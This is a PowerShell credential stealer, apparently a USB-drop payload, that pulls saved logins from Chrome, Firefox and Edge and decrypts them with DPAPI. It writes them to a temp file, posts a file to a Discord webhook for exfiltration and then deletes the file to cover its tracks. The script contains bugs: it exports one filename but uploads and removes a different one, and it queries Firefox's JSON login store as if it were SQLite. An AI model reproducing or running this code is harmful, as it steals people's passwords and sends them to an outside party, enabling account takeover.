function Get-BrowserSavedPasswords {

    [CmdletBinding()]
    param (	
        [Parameter(Position=1, Mandatory=$true)]
        [string]$Browser
    ) 

    if ($Browser -eq 'chrome') {
        $Path = "$Env:LocalAppData\Google\Chrome\User Data\Default\Login Data"
    }
    elseif ($Browser -eq 'firefox') {
        $ProfilesPath = "$Env:AppData\Mozilla\Firefox\Profiles"
        $ProfileFolder = Get-ChildItem -Path $ProfilesPath | Select-Object -First 1 -ExpandProperty Name
        $Path = "$ProfilesPath\$ProfileFolder\logins.json"
    }
    elseif ($Browser -eq 'edge') {
        $Path = "$Env:LocalAppData\Microsoft\Edge\User Data\Default\Login Data"
    }

    $Passwords = @()
    if (Test-Path -Path $Path) {
        $Database = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList "Data Source=$Path;Version=3;New=False;Compress=True;"
        $Database.Open()
        $Command = $Database.CreateCommand()
        $Command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
        $Reader = $Command.ExecuteReader()

        while ($Reader.Read()) {
            $OriginURL = $Reader.GetValue(0)
            $Username = [System.Text.Encoding]::UTF8.GetString($Reader.GetValue(1))
            $Password = [System.Security.Cryptography.ProtectedData]::Unprotect($Reader.GetValue(2), $null, 'CurrentUser')
            $Passwords += [PSCustomObject]@{
                User = $env:UserName
                Browser = $Browser
                OriginURL = $OriginURL
                Username = $Username
                Password = $Password
            }
        }

        $Reader.Close()
        $Database.Close()
    }

    $Passwords
}

$ChromePasswords = Get-BrowserSavedPasswords -Browser 'chrome'
$FirefoxPasswords = Get-BrowserSavedPasswords -Browser 'firefox'
$EdgePasswords = Get-BrowserSavedPasswords -Browser 'edge'

$AllPasswords = $ChromePasswords + $FirefoxPasswords + $EdgePasswords
$AllPasswords | Export-Csv -Path "$env:TMP\--BrowserPasswords.csv" -NoTypeInformation

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\--BrowserData.txt}


############################################################################################################################################################
RI $env:TEMP/--BrowserData.txt
